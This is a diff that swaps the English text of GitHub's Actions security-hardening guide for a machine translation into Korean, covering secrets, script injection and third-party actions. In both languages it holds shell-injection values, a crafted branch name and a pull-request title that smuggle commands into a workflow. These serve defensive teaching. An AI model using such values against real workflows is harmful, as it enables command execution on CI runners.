@@ -1,7 +1,7 @@
 ---
-title: Security hardening for GitHub Actions
+title: GitHub Actions에 대한 보안 강화
 shortTitle: Security hardening
-intro: 'Good security practices for using {% data variables.product.prodname_actions %} features.'
+intro: '{% data variables.product.prodname_actions %} 기능을 사용하는 적절한 보안 사례입니다.'
 redirect_from:
   - /actions/getting-started-with-github-actions/security-hardening-for-github-actions
   - /actions/learn-github-actions/security-hardening-for-github-actions
@@ -14,67 +14,71 @@ type: overview
 topics:
   - Security
 miniTocMaxHeadingLevel: 3
+ms.openlocfilehash: 0f93496361500083c23ef6f5095a785855246503
+ms.sourcegitcommit: b617c4a7a1e4bf2de3987a86e0eb217d7031490f
+ms.translationtype: MT
+ms.contentlocale: ko-KR
+ms.lasthandoff: 11/11/2022
+ms.locfileid: '148161217'
 ---
+{% data reusables.actions.enterprise-beta %} {% data reusables.actions.enterprise-github-hosted-runners %}
 
-{% data reusables.actions.enterprise-beta %}
-{% data reusables.actions.enterprise-github-hosted-runners %}
+## 개요
 
-## Overview
+이 가이드에서는 특정 {% data variables.product.prodname_actions %} 기능에 대한 보안 강화를 구성하는 방법을 설명합니다. {% data variables.product.prodname_actions %} 개념이 익숙하지 않은 경우 “[GitHub Actions 핵심 개념](/actions/getting-started-with-github-actions/core-concepts-for-github-actions)”을 참조하세요.
 
-This guide explains how to configure security hardening for certain {% data variables.product.prodname_actions %} features. If the {% data variables.product.prodname_actions %} concepts are unfamiliar, see "[Core concepts for GitHub Actions](/actions/getting-started-with-github-actions/core-concepts-for-github-actions)."
+## 비밀 사용
 
-## Using secrets
+중요한 값은 워크플로 파일에 일반 텍스트로 저장하지 말아야 하며 비밀로 저장하는 것이 좋습니다. [비밀](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets)은 조직, 리포지토리 또는 환경 수준에서 구성할 수 있으며 {% data variables.product.product_name %}에 중요한 정보를 저장할 수 있습니다.
 
-Sensitive values should never be stored as plaintext in workflow files, but rather as secrets. [Secrets](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets) can be configured at the organization, repository, or environment level, and allow you to store sensitive information in {% data variables.product.product_name %}.
+비밀은 [은 Libsodium 봉인 상자](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes)를 사용하므로 {% data variables.product.product_name %}에 도달하기 전에 암호화됩니다. 이는 [UI를 사용](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository)하거나 [REST API](/rest/reference/actions#secrets)를 통해 비밀을 제출할 때 발생합니다. 이 클라이언트 쪽 암호화는 {% data variables.product.product_name %}의 인프라 내에서 실수로 인한 로깅(예: 예외 로그 및 요청 로그 등)과 관련된 위험을 최소화하는 데 도움이 됩니다. 비밀이 업로드되면 {% data variables.product.product_name %}에서 암호를 해독하여 워크플로 런타임에 삽입할 수 있습니다.
 
-Secrets use [Libsodium sealed boxes](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes), so that they are encrypted before reaching {% data variables.product.product_name %}. This occurs when the secret is submitted [using the UI](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository) or through the [REST API](/rest/reference/actions#secrets). This client-side encryption helps minimize the risks related to accidental logging (for example, exception logs and request logs, among others) within {% data variables.product.product_name %}'s infrastructure. Once the secret is uploaded, {% data variables.product.product_name %} is then able to decrypt it so that it can be injected into the workflow runtime.
+실수로 인한 공개를 방지하기 위해 {% data variables.product.product_name %}는 실행 로그에 표시되는 비밀을 수정하는 메커니즘을 사용합니다. 이 편집은 Base64와 같은 값의 일반적인 인코딩뿐만 아니라 구성된 비밀의 정확한 일치 항목을 찾습니다. 그러나 비밀 값을 변환할 수 있는 여러 가지 방법이 있기 때문에 이 수정이 보장되지는 않습니다. 따라서 비밀이 수정되도록 하고 비밀과 관련된 다른 위험을 제한하기 위해 따라야 하는 특정 사전 단계와 모범 사례가 있습니다.
 
-To help prevent accidental disclosure, {% data variables.product.product_name %} uses a mechanism that attempts to redact any secrets that appear in run logs. This redaction looks for exact matches of any configured secrets, as well as common encodings of the values, such as Base64. However, because there are multiple ways a secret value can be transformed, this redaction is not guaranteed. As a result, there are certain proactive steps and good practices you should follow to help ensure secrets are redacted, and to limit other risks associated with secrets:
-
-- **Never use structured data as a secret**
-    - Structured data can cause secret redaction within logs to fail, because redaction largely relies on finding an exact match for the specific secret value. For example, do not use a blob of JSON, XML, or YAML (or similar) to encapsulate a secret value, as this significantly reduces the probability the secrets will be properly redacted. Instead, create individual secrets for each sensitive value.
-- **Register all secrets used within workflows**
-    - If a secret is used to generate another sensitive value within a workflow, that generated value should be formally [registered as a secret](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret), so that it will be redacted if it ever appears in the logs. For example, if using a private key to generate a signed JWT to access a web API, be sure to register that JWT as a secret or else it won’t be redacted if it ever enters the log output.
-    - Registering secrets applies to any sort of transformation/encoding as well. If your secret is transformed in some way (such as Base64 or URL-encoded), be sure to register the new value as a secret too.
-- **Audit how secrets are handled**
-    - Audit how secrets are used, to help ensure they’re being handled as expected. You can do this by reviewing the source code of the repository executing the workflow, and checking any actions used in the workflow. For example, check that they’re not sent to unintended hosts, or explicitly being printed to log output.
-    - View the run logs for your workflow after testing valid/invalid inputs, and check that secrets are properly redacted, or not shown. It's not always obvious how a command or tool you’re invoking will send errors to `STDOUT` and `STDERR`, and secrets might subsequently end up in error logs. As a result, it is good practice to manually review the workflow logs after testing valid and invalid inputs.
-- **Use credentials that are minimally scoped**
-    - Make sure the credentials being used within workflows have the least privileges required, and be mindful that any user with write access to your repository has read access to all secrets configured in your repository. 
-    - Actions can use the `GITHUB_TOKEN` by accessing it from the `github.token` context. For more information, see "[Contexts](/actions/learn-github-actions/contexts#github-context)." You should therefore make sure that the `GITHUB_TOKEN` is granted the minimum required permissions. It's good security practice to set the default permission for the `GITHUB_TOKEN` to read access only for repository contents. The permissions can then be increased, as required, for individual jobs within the workflow file. For more information, see "[Authentication in a workflow](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)." 
-- **Audit and rotate registered secrets**
-    - Periodically review the registered secrets to confirm they are still required. Remove those that are no longer needed.
-    - Rotate secrets periodically to reduce the window of time during which a compromised secret is valid.
-- **Consider requiring review for access to secrets**
-    - You can use required reviewers to protect environment secrets. A workflow job cannot access environment secrets until approval is granted by a reviewer. For more information about storing secrets in environments or requiring reviews for environments, see "[Encrypted secrets](/actions/reference/encrypted-secrets)" and "[Using environments for deployment](/actions/deployment/using-environments-for-deployment)."
+- **정형 데이터를 비밀로 사용하지 마세요.**
+    - 정형 데이터로 인해 로그 내에서 비밀 편집이 실패할 수 있습니다. 편집은 주로 특정 비밀 값에 대한 정확한 일치 항목을 찾는 데 의존하기 때문입니다. BLOB예를 들어 JSON, XML 또는 YAML(또는 이와 유사한) BLOB을 사용하여 비밀 값을 캡슐화하지 마세요. 이렇게 하면 비밀이 제대로 수정될 확률이 크게 줄어듭니다. 대신 각 중요한 값에 대한 개별 비밀을 만듭니다.
+- **워크플로 내에서 사용되는 모든 비밀 등록**
+    - 워크플로 내에서 다른 중요한 값을 생성하는 데 비밀을 사용하는 경우 생성된 값은 로그에 표시되는 경우 수정되도록 공식적으로 [비밀로 등록](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret)되어야 합니다. 예를 들어 프라이빗 키를 사용하여 서명된 JWT를 생성하여 웹 API에 액세스하는 경우 해당 JWT를 비밀로 등록해야 합니다. 그렇지 않으면 로그 출력에 들어가면 수정되지 않습니다.
+    - 비밀 등록은 모든 종류의 변환/인코딩에도 적용됩니다. 비밀이 어떤 방식으로든 변환되는 경우(예: Base64 또는 URL 인코딩) 새 값도 비밀로 등록해야 합니다.
+- **비밀 처리 방법 감사**
+    - 비밀이 예상대로 처리되고 있는지 확인하기 위해 비밀이 사용되는 방법을 감사합니다. 워크플로를 실행하는 리포지토리의 소스 코드를 검토하고 워크플로에 사용된 작업을 확인하여 이 작업을 수행할 수 있습니다. 예를 들어 의도하지 않은 호스트로 보내지거나 로그 출력에 명시적으로 인쇄되지 않는지 확인합니다.
+    - 유효한 입력 및 유효하지 않은 입력을 테스트한 후 워크플로에 대한 실행 로그를 보고 비밀이 제대로 수정되었거나 표시되지 않는지 확인합니다. 호출하는 명령 또는 도구가 `STDOUT` 및 `STDERR`에 오류를 보내고 비밀이 이후에 오류 로그로 끝날 수 있는 방법이 항상 명확하지는 않습니다. 따라서 유효한 입력 및 유효하지 않은 입력을 테스트한 후 워크플로 로그를 수동으로 검토하는 것이 좋습니다.
+- **최소 범위의 자격 증명 사용**
+    - 워크플로 내에서 사용되는 자격 증명에 필요한 최소 권한이 있는지 확인하고, 리포지토리에 대한 쓰기 액세스가 있는 모든 사용자에게 리포지토리에 구성된 모든 비밀에 대한 읽기 액세스가 있음을 염두에 두어야 합니다. 
+    - 작업은 `GITHUB_TOKEN` 컨텍스트에서 액세스하여 `github.token`을 사용할 수 있습니다. 자세한 내용은 “[컨텍스트](/actions/learn-github-actions/contexts#github-context)”를 참조하세요. 따라서 `GITHUB_TOKEN`에 필요한 최소 사용 권한이 부여되었는지 확인해야 합니다. `GITHUB_TOKEN`에 리포지토리 콘텐츠에 대해서만 읽기 액세스를 갖는 기본 권한을 설정하는 것이 좋습니다. 그런 다음 필요에 따라 워크플로 파일 내의 개별 작업에 대한 권한을 늘릴 수 있습니다. 자세한 내용은 “[워크플로의 인증](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)”을 참조하세요. 
+- **등록된 비밀 감사 및 회전**
+    - 등록된 비밀을 주기적으로 검토하여 여전히 필요한지 확인합니다. 더 이상 필요하지 않은 엔드포인트는 제거합니다.
+    - 비밀을 주기적으로 회전하여 손상된 비밀이 유효한 기간을 줄입니다.
+- **비밀 액세스에 대한 검토 요구 고려**
+    - 필요한 검토자를 사용하여 환경 비밀을 보호할 수 있습니다. 즉, 검토자가 승인할 때까지 워크플로 작업이 환경 비밀에 액세스할 수 없습니다. 환경에 비밀을 저장하거나 환경에 대한 검토를 요구하는 방법에 대한 자세한 내용은 “[암호화된 비밀](/actions/reference/encrypted-secrets)” 및 “[배포를 위한 환경 사용](/actions/deployment/using-environments-for-deployment)”을 참조하세요.
 
 {% warning %}
 
-**Warning**: Any user with write access to your repository has read access to all secrets configured in your repository. Therefore, you should ensure that the credentials being used within workflows have the least privileges required.
+**경고**: 리포지토리에 대한 쓰기 권한이 있는 모든 사용자는 리포지토리에 구성된 모든 비밀에 대한 읽기 액세스 권한을 갖습니다. 따라서 워크플로 내에서 사용되는 자격 증명에 필요한 최소 권한이 있는지 확인해야 합니다.
 
 {% endwarning %}
 
-## Using `CODEOWNERS` to monitor changes
+## 변경 내용을 모니터링하는 데 `CODEOWNERS` 사용
 
-You can use the `CODEOWNERS` feature to control how changes are made to your workflow files. For example, if all your workflow files are stored in `.github/workflows`, you can add this directory to the code owners list, so that any proposed changes to these files will first require approval from a designated reviewer.
+`CODEOWNERS` 기능을 사용하여 워크플로 파일을 변경하는 방법을 제어할 수 있습니다. 예를 들어 `.github/workflows`에 모든 워크플로 파일이 저장되어 있는 경우 이 디렉터리를 코드 소유자 목록에 추가할 수 있으므로 해당 파일에 대한 제안된 변경 내용은 먼저 지정된 검토자의 승인이 필요합니다.
 
-For more information, see "[About code owners](/github/creating-cloning-and-archiving-repositories/about-code-owners)."
+자세한 내용은 “[코드 사용자 정보](/github/creating-cloning-and-archiving-repositories/about-code-owners)”를 참조하세요.
 
-## Understanding the risk of script injections
+## 스크립트 삽입의 위험 이해
 
-When creating workflows, [custom actions](/actions/creating-actions/about-actions), and [composite actions](/actions/creating-actions/creating-a-composite-action) actions, you should always consider whether your code might execute untrusted input from attackers. This can occur when an attacker adds malicious commands and scripts to a context. When your workflow runs, those strings might be interpreted as code which is then executed on the runner.
+워크플로, [사용자 지정 작업](/actions/creating-actions/about-actions) 및 [복합 작업](/actions/creating-actions/creating-a-composite-action) 작업을 만들 때 코드가 공격자의 신뢰할 수 없는 입력을 실행할 수 있는지 항상 고려해야 합니다. 이는 공격자가 악의적인 명령과 스크립트를 컨텍스트에 추가할 때 발생할 수 있습니다. 워크플로가 실행되면 해당 문자열이 실행기에서 실행되는 코드로 해석될 수 있습니다.
 
- Attackers can add their own malicious content to the [`github` context](/actions/reference/context-and-expression-syntax-for-github-actions#github-context), which should be treated as potentially untrusted input. These contexts typically end with `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref`, and `title`.  For example: `github.event.issue.title`, or `github.event.pull_request.body`.
+ 공격자는 잠재적으로 신뢰할 수 없는 입력으로 처리되어야 하는 [`github`컨텍스트](/actions/reference/context-and-expression-syntax-for-github-actions#github-context)에 자신의 악성 콘텐츠를 추가할 수 있습니다. 해당 컨텍스트는 일반적으로 `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`, `ref` 및 `title`로 끝납니다.  예를 들면 `github.event.issue.title` 또는 `github.event.pull_request.body`입니다.
 
- You should ensure that these values do not flow directly into workflows, actions, API calls, or anywhere else where they could be interpreted as executable code. By adopting the same defensive programming posture you would use for any other privileged application code, you can help security harden your use of {% data variables.product.prodname_actions %}. For information on some of the steps an attacker could take, see ["Potential impact of a compromised runner](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)."
+ 값이 워크플로, 작업, API 호출 또는 실행 코드로 해석될 수 있는 다른 위치로 직접 전달되지 않도록 해야 합니다. 다른 권한 있는 애플리케이션 코드에 사용하는 것과 동일한 방어 프로그래밍 상태를 채택하면 보안이 {% data variables.product.prodname_actions %}의 사용을 강화하는 데 도움이 될 수 있습니다. 공격자가 수행할 수 있는 몇 가지 단계에 대한 자세한 내용은 [“손상된 실행기의 잠재적 영향](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)”을 참조하세요.
 
-In addition, there are other less obvious sources of potentially untrusted input, such as branch names and email addresses, which can be quite flexible in terms of their permitted content. For example, `zzz";echo${IFS}"hello";#` would be a valid branch name and would be a possible attack vector for a target repository.
+또한 분기 이름 및 메일 주소와 같이 잠재적으로 신뢰할 수 없는 입력의 기타 불분명한 원본이 있으며 이는 허용된 콘텐츠 측면에서 매우 유연할 수 있습니다. 예를 들어 `zzz";echo${IFS}"hello";#`는 유효한 분기 이름이고 대상 리포지토리에 대한 가능한 공격 벡터입니다.
 
-The following sections explain how you can help mitigate the risk of script injection.
+다음 섹션에서는 스크립트 삽입의 위험을 완화하는 방법을 설명합니다.
 
-### Example of a script injection attack
+### 스크립트 삽입 공격의 예
 
-A script injection attack can occur directly within a workflow's inline script. In the following example, an action uses an expression to test the validity of a pull request title, but also adds the risk of script injection:
+스크립트 삽입 공격은 워크플로의 인라인 스크립트 내에서 직접 발생할 수 있습니다. 다음 예제에서 작업은 식을 사용하여 끌어오기 요청 제목의 유효성을 테스트하지만 스크립트 삽입의 위험도 추가합니다.
 
 {% raw %}
 ```
@@ -91,23 +95,23 @@ A script injection attack can occur directly within a workflow's inline script. 
 ```
 {% endraw %}
 
-This example is vulnerable to script injection because the `run` command executes within a temporary shell script on the runner. Before the shell script is run, the expressions inside {% raw %}`${{ }}`{% endraw %} are evaluated and then substituted with the resulting values, which can make it vulnerable to shell command injection.
+이 예제는 `run` 명령이 실행기에서 임시 셸 스크립트 내에서 실행되므로 스크립트 삽입에 취약합니다. 셸 스크립트를 실행하기 전에 {% raw %}`${{ }}`{% endraw %} 내의 식이 평가된 다음 결과 값으로 대체되어 셸 명령 삽입에 취약할 수 있습니다.
 
-To inject commands into this workflow, the attacker could create a pull request with a title of  `a"; ls $GITHUB_WORKSPACE"`:
+이 워크플로에 명령을 삽입하기 위해 공격자는 다음과 같이 `a"; ls $GITHUB_WORKSPACE"`라는 제목으로 끌어오기 요청을 만들 수 있습니다.
 
-![Example of script injection in PR title](/assets/images/help/images/example-script-injection-pr-title.png)
+![PR 제목의 스크립트 삽입 예제](/assets/images/help/images/example-script-injection-pr-title.png)
 
-In this example, the `"` character is used to interrupt the {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %} statement, allowing the `ls` command to be executed on the runner. You can see the output of the `ls` command in the log:
+이 예제에서 `"` 문자는 {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %} 문을 중단하여 실행기에서 `ls` 명령을 실행할 수 있도록 하는 데 사용됩니다. 로그에서 `ls` 명령의 출력을 볼 수 있습니다.
 
-![Example result of script injection](/assets/images/help/images/example-script-injection-result.png)
+![스크립트 삽입의 예제 결과](/assets/images/help/images/example-script-injection-result.png)
 
-## Good practices for mitigating script injection attacks
+## 스크립트 삽입 공격을 완화하기 위한 모범 사례
 
-There are a number of different approaches available to help you mitigate the risk of script injection:
+스크립트 삽입의 위험을 완화하는 데 사용할 수 있는 다양한 방법이 있습니다.
 
-### Using an action instead of an inline script (recommended)
+### 인라인 스크립트 대신 작업 사용(권장)
 
-The recommended approach is to create an action that processes the context value as an argument. This approach is not vulnerable to the injection attack, as the context value is not used to generate a shell script, but is instead passed to the action as an argument:
+컨텍스트 값을 인수로 처리하는 작업을 만드는 것이 좋습니다. 컨텍스트 값은 셸 스크립트를 생성하는 데 사용되지 않고 대신 작업에 인수로 전달되므로 이 방법은 삽입 공격에 취약하지 않습니다.
 
 {% raw %}
 ```
@@ -117,11 +121,11 @@ with:
 ```
 {% endraw %}
 
-### Using an intermediate environment variable
+### 중간 환경 변수 사용
 
-For inline scripts, the preferred approach to handling untrusted input is to set the value of the expression to an intermediate environment variable.
+인라인 스크립트의 경우 신뢰할 수 없는 입력을 처리하는 기본 방법은 식 값을 중간 환경 변수로 설정하는 것입니다.
 
-The following example uses Bash to process the `github.event.pull_request.title` value as an environment variable:
+다음 예제에서는 Bash를 사용하여 `github.event.pull_request.title` 값을 환경 변수로 처리합니다.
 
 {% raw %}
 ```
@@ -139,95 +143,94 @@ The following example uses Bash to process the `github.event.pull_request.title`
 ```
 {% endraw %}
 
-In this example, the attempted script injection is unsuccessful:
+이 예제에서 시도한 스크립트 삽입은 실패합니다.
 
-![Example of mitigated script injection](/assets/images/help/images/example-script-injection-mitigated.png)
+![완화된 스크립트 삽입의 예](/assets/images/help/images/example-script-injection-mitigated.png)
 
-With this approach, the value of the {% raw %}`${{ github.event.issue.title }}`{% endraw %} expression is stored in memory and used as a variable, and doesn't interact with the script generation process. In addition, consider using double quote shell variables to avoid [word splitting](https://github.com/koalaman/shellcheck/wiki/SC2086), but this is [one of many](https://mywiki.wooledge.org/BashPitfalls) general recommendations for writing shell scripts, and is not specific to {% data variables.product.prodname_actions %}.
+이 방법을 사용하면 {% raw %}`${{ github.event.issue.title }}`{% endraw %} 식의 값이 메모리에 저장되고 변수로 사용되며 스크립트 생성 프로세스와 상호 작용하지 않습니다. 또한 [단어 분할](https://github.com/koalaman/shellcheck/wiki/SC2086)을 방지하기 위해 큰따옴표 셸 변수를 사용하는 것이 좋지만 이는 셸 스크립트를 작성하기 위한 일반적인 권장 사항 [중 하나이며](https://mywiki.wooledge.org/BashPitfalls) {% data variables.product.prodname_actions %}에 한정되지 않습니다.
 
 {% ifversion fpt or ghec %}
-### Using starter workflows for code scanning
+### 코드 검사에 시작 워크플로 사용
 
-{% data reusables.advanced-security.starter-workflows-beta %}
-{% data variables.product.prodname_code_scanning_capc %} allows you to find security vulnerabilities before they reach production. {% data variables.product.product_name %} provides starter workflows for {% data variables.product.prodname_code_scanning %}. You can use these suggested workflows to construct your {% data variables.product.prodname_code_scanning %} workflows, instead of starting from scratch. {% data variables.product.company_short%}'s workflow, the {% data variables.code-scanning.codeql_workflow %}, is powered by {% data variables.product.prodname_codeql %}. There are also third-party starter workflows available.
+{% data reusables.advanced-security.starter-workflows-beta %} {% data variables.product.prodname_code_scanning_capc %}을 사용하면 프로덕션 환경에 도달하기 전에 보안 취약성을 찾을 수 있습니다. {% data variables.product.product_name %}는 {% data variables.product.prodname_code_scanning %}에 대한 시작 워크플로를 제공합니다. 처음부터 시작하는 대신 제안된 워크플로를 사용하여 {% data variables.product.prodname_code_scanning %} 워크플로를 구성할 수 있습니다. {% data variables.product.company_short%}의 워크플로인 {% data variables.code-scanning.codeql_workflow %}는 {% data variables.product.prodname_codeql %}에서 구동됩니다. 타사 시작 워크플로도 사용할 수 있습니다.
 
-For more information, see "[About {% data variables.product.prodname_code_scanning %}](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning)" and "[Setting up {% data variables.product.prodname_code_scanning %} using starter workflows](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows)."
+자세한 내용은 “[{% data variables.product.prodname_code_scanning %} 정보](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning)” 및 “[시작 워크플로를 사용하여 {% data variables.product.prodname_code_scanning %} 설정](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows)”을 참조하세요.
 
 {% endif %}
 
-### Restricting permissions for tokens
+### 토큰에 대한 권한 제한
 
-To help mitigate the risk of an exposed token, consider restricting the assigned permissions. For more information, see "[Modifying the permissions for the GITHUB_TOKEN](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token)."
+노출된 토큰의 위험을 완화하려면 할당된 권한을 제한하는 것이 좋습니다. 자세한 내용은 “[GITHUB_TOKEN에 대한 권한 수정](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token)”을 참조하세요.
 
 {% ifversion fpt or ghec or ghes > 3.4 %}
 
-## Using OpenID Connect to access cloud resources
+## OpenID Connect를 사용하여 클라우드 리소스에 액세스
 
 {% data reusables.actions.about-oidc-short-overview %}
 
 {% endif %}
 
-## Using third-party actions
+## 타사 작업 사용
 
-The individual jobs in a workflow can interact with (and compromise) other jobs. For example, a job querying the environment variables used by a later job, writing files to a shared directory that a later job processes, or even more directly by interacting with the Docker socket and inspecting other running containers and executing commands in them.
+워크플로의 개별 작업은 다른 작업과 상호 작용하고 손상시킬 수 있습니다. 예를 들어, 이후 작업에서 사용하는 환경 변수를 쿼리하거나, 이후 작업에서 처리하는 공유 디렉터리에 파일을 쓰거나, Docker 소켓과 상호 작용하고 실행 중인 다른 컨테이너를 검사하고 명령을 실행하여 더욱 직접적으로 작업합니다.
 
-This means that a compromise of a single action within a workflow can be very significant, as that compromised action would have access to all secrets configured on your repository, and may be able to use the `GITHUB_TOKEN` to write to the repository. Consequently, there is significant risk in sourcing actions from third-party repositories on {% data variables.product.prodname_dotcom %}. For information on some of the steps an attacker could take, see ["Potential impact of a compromised runner](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)."
+즉, 손상된 작업이 리포지토리에 구성된 모든 비밀에 액세스할 수 있고 리포지토리에 쓰는 데 `GITHUB_TOKEN`을 사용할 수 있기 때문에 워크플로 내에서 단일 작업의 손상이 매우 중요할 수 있습니다. 따라서 {% data variables.product.prodname_dotcom %}의 타사 리포지토리에서 작업을 소싱할 때 상당한 위험이 있습니다. 공격자가 수행할 수 있는 몇 가지 단계에 대한 자세한 내용은 [“손상된 실행기의 잠재적 영향](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner)”을 참조하세요.
 
-You can help mitigate this risk by following these good practices:
+다음 모범 사례를 따라하여 이 위험을 완화할 수 있습니다.
 
-* **Pin actions to a full length commit SHA**
+* **전체 길이 커밋 SHA에 작업 고정**
 
-  Pinning an action to a full length commit SHA is currently the only way to use an action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload.
+  작업을 전체 길이 커밋 SHA에 고정하는 것은 현재 변경할 수 없는 릴리스로 작업을 사용하는 유일한 방법입니다. 특정 SHA에 고정하면 유효한 Git 개체 페이로드에 대한 SHA-1 충돌을 생성해야 하므로 잘못된 행위자가 작업 리포지토리에 백도어를 추가하는 위험을 완화할 수 있습니다.
 
-* **Audit the source code of the action**
+* **작업의 소스 코드 감사**
 
-  Ensure that the action is handling the content of your repository and secrets as expected. For example, check that secrets are not sent to unintended hosts, or are not inadvertently logged.
+  작업이 리포지토리의 콘텐츠 및 비밀을 예상대로 처리하는지 확인합니다. 예를 들어 비밀이 의도하지 않은 호스트로 전송되거나 실수로 기록되지 않는지 확인합니다.
 
-* **Pin actions to a tag only if you trust the creator**
+* **작성자를 신뢰하는 경우에만 태그에 작업 고정**
 
-  Although pinning to a commit SHA is the most secure option, specifying a tag is more convenient and is widely used. If you’d like to specify a tag, then be sure that you trust the action's creators. The ‘Verified creator’ badge on {% data variables.product.prodname_marketplace %} is a useful signal, as it indicates that the action was written by a team whose identity has been verified by {% data variables.product.prodname_dotcom %}. Note that there is risk to this approach even if you trust the author, because a tag can be moved or deleted if a bad actor gains access to the repository storing the action.
+  커밋 SHA에 고정하는 것이 가장 안전한 옵션이지만 태그를 지정하는 것이 더 편리하며 널리 사용됩니다. 태그를 지정하려면 작업의 작성자를 신뢰해야 합니다. {% data variables.product.prodname_marketplace %}의 ‘확인된 작성자’ 배지는 {% data variables.product.prodname_dotcom %}가 ID를 확인한 팀에서 작업을 작성했음을 나타내는 유용한 신호입니다. 잘못된 행위자가 작업을 저장하는 리포지토리에 대한 액세스 권한을 얻게 되면 태그를 이동하거나 삭제할 수 있으므로 작성자를 신뢰하더라도 이 접근 방식에는 위험이 있습니다.
 
 {% ifversion fpt or ghes > 3.3 or ghae > 3.3 or ghec %}
-## Reusing third-party workflows
+## 타사 워크플로 다시 사용
 
-The same principles described above for using third-party actions also apply to using third-party workflows. You can help mitigate the risks associated with reusing workflows by following the same good practices outlined above. For more information, see "[Reusing workflows](/actions/learn-github-actions/reusing-workflows)."
+타사 작업 사용에 대해 위에서 설명한 것과 동일한 원칙이 타사 워크플로 사용에도 적용됩니다. 위에서 설명한 것과 동일한 모범 사례를 따라하여 워크플로 재사용과 관련된 위험을 완화할 수 있습니다. 자세한 내용은 “[워크플로 다시 사용](/actions/learn-github-actions/reusing-workflows)”을 참조하세요.
 {% endif %}
 
 {% ifversion internal-actions %}
-## Allowing workflows to access internal repositories
+## 워크플로가 내부 리포지토리에 액세스하도록 허용
 
-{% data reusables.actions.outside-collaborators-internal-actions %} For more information, see "[Sharing actions and workflows with your enterprise](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise)."
+{% data reusables.actions.outside-collaborators-internal-actions %} 자세한 내용은 “[엔터프라이즈와 작업 및 워크플로 공유](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise)”를 참조하세요.
 {% endif %}
 
 {% ifversion allow-actions-to-approve-pr %}
-## Preventing {% data variables.product.prodname_actions %} from {% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating or {% endif %}approving pull requests
+## {% data variables.product.prodname_actions %}가 끌어오기 요청을 {% ifversion allow-actions-to-approve-pr-with-ent-repo %}만들거나 {% endif %}승인하는 것 방지
 
-{% data reusables.actions.workflow-pr-approval-permissions-intro %} Allowing workflows, or any other automation, to {% ifversion allow-actions-to-approve-pr-with-ent-repo %}create or {% endif %}approve pull requests could be a security risk if the pull request is merged without proper oversight.
+{% data reusables.actions.workflow-pr-approval-permissions-intro %} 워크플로 또는 기타 자동화를 허용하면 끌어오기 요청이 적절한 감독 없이 병합될 경우 {% ifversion allow-actions-to-approve-pr-with-ent-repo %}만들기 또는 {% endif %}끌어오기 요청 승인이 보안 위험이 될 수 있습니다.
 
-For more information on how to configure this setting, see {% ifversion allow-actions-to-approve-pr-with-ent-repo %}{% ifversion ghes or ghec or ghae %}"[Enforcing policies for {% data variables.product.prodname_actions %} in your enterprise](/enterprise-cloud@latest/admin/policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#preventing-github-actions-from-creating-or-approving-pull-requests)",{% endif %}{% endif %} "[Disabling or limiting {% data variables.product.prodname_actions %} for your organization](/github/setting-up-and-managing-organizations-and-teams/disabling-or-limiting-github-actions-for-your-organization#preventing-github-actions-from-{% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating-or-{% endif %}approving-pull-requests)"{% ifversion allow-actions-to-approve-pr-with-ent-repo %}, and "[Managing {% data variables.product.prodname_actions %} settings for a repository](/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests)"{% endif %}.
+이 설정을 구성하는 방법에 대한 자세한 내용은 {% ifversion allow-actions-to-approve-pr-with-ent-repo %}{% ifversion ghes or ghec or ghae %}“[엔터프라이즈의 {% data variables.product.prodname_actions %}에 대한 정책 적용](/enterprise-cloud@latest/admin/policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#preventing-github-actions-from-creating-or-approving-pull-requests)”,{% endif %}{% endif %} “[조직의 {% data variables.product.prodname_actions %} 비활성화 또는 제한](/github/setting-up-and-managing-organizations-and-teams/disabling-or-limiting-github-actions-for-your-organization#preventing-github-actions-from-{% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating-or-{% endif %}approving-pull-requests)”{% ifversion allow-actions-to-approve-pr-with-ent-repo %} 및 “[ 리포지토리에 대한 {% data variables.product.prodname_actions %} 설정 관리](/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests)”{% endif %}를 참조하세요.
 {% endif %}
 
-## Using OpenSSF Scorecards to secure workflows
+## OpenSSF 성과 기록표를 사용하여 워크플로 보호
 
